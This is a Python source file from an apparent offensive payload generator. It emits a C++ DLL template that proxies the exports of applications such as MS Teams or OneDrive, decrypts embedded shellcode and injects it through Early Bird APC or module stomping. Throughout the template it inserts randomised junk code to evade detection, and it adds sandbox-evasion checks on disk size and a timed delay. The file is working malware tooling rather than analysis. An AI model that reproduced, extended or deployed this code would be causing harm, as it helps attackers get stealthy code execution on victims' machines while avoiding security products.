import secrets

from Injection.EarlyBird_Injection import EarlyBird
from Injection.Module_Stomping import ModuleStomping
from Encryption.Choose_Encryption import ChosenEncryption
from Evasion.Obfuscator import obfuscator

# here we specify the DLL skeleton 
def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type,array,size):
    c_template = f"""
    #include <stdio.h>
    #include "code.h"
    #include <stdlib.h>
    #include "syscalls_mem.h"
    #include <iostream>
    #include <cstring>
    #include <cstdio>
    #include <cstdlib>
    #include <ctime>
    #include <cmath>
    #include <Windows.h>
    #include <iostream>
    #include <string>
    
    using namespace std; 

    #define _CRT_SECURE_NO_DEPRECATE
    #pragma warning (disable : 4996)
    
    //here DLL exports are specified based an the user choice either MS Teams || OneDrive

    {file_contents}

    //Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
    //We must use sharpdllproxy to auto make us a C file which will include all this exports.
    //In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls
    
    {obfuscator(secrets.choice(array),secrets.choice(size),1,0)}

    BOOL executed = FALSE;

    //decryption
    {obfuscator(secrets.choice(array),secrets.choice(size),1,0)}
    {ChosenEncryption(encryption_type,xor_func)}
    {obfuscator(secrets.choice(array),secrets.choice(size),1,0)}
    {obfuscator(secrets.choice(array),secrets.choice(size),1,0)}
    
    //Timing attack using waitable timers. 
    //Test fails if any of the calls return an error state.
    BOOL timing_CreateWaitableTimer(UINT delayInMillis)
    {{
        HANDLE hTimer;
        LARGE_INTEGER dueTime;
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        BOOL bResult = FALSE;

        dueTime.QuadPart = delayInMillis * -10000LL;

        hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        if (hTimer == NULL)
        {{
            return TRUE;
        }}
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
        {{
            bResult = TRUE;
        }}
        else {{
            if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
            {{
                bResult = TRUE;
            }}
            
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        }}
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        CancelWaitableTimer(hTimer);
        CloseHandle(hTimer);
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        return bResult;
    }}
    
    //sandbox check to check hardrive 
    int gensandbox_drive_size() {{
        GET_LENGTH_INFORMATION size;
        DWORD lpBytesReturned;
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        HANDLE drive = CreateFile(L"\\\\\\\.\\\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (drive == INVALID_HANDLE_VALUE) {{
            // Someone is playing tricks. Or not {shellcode_var} enough privileges.
            CloseHandle(drive);
            return FALSE;
        }}
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
        CloseHandle(drive);
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}

        if (result != 0) {{
            if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
                return TRUE;
        }}
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}

        return FALSE;
    }}

    DWORD WINAPI DoMagic(LPVOID lpParameter)
    {{
        {obfuscator(secrets.choice(array),secrets.choice(size),1,1)}
        {EarlyBird(shellcode_var, ciphertext_split, process_to_inject, xor_func, key_var, key_hex,encryption_type,array,size)
            if injection == "EB" else ModuleStomping() if injection == "MS" else ""}
        {obfuscator(secrets.choice(array),secrets.choice(size),1,1)}
    }}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {{
    
    {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
    
    LPVOID allocation_start;
        HANDLE hThread;
        allocation_start = nullptr;
        //HANDLE threadHandle;
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        switch (ul_reason_for_call)
        {{
        case DLL_PROCESS_ATTACH:
        {{
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
            
            //sandbox check for harddisk size
            gensandbox_drive_size();
            
             //delay execution to evade sandbox
            timing_CreateWaitableTimer({time});


            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}

            hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
            CloseHandle(hThread);
            
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
            }}
        case DLL_THREAD_ATTACH:
        {{
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
            }}
            break;
        case DLL_THREAD_DETACH:
        {{
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
            }}
            break;
        case DLL_PROCESS_DETACH:
        {{
            {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
            }}
            break;
        }}
        
        {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
        
        return TRUE;
    }}
    """
    return c_template
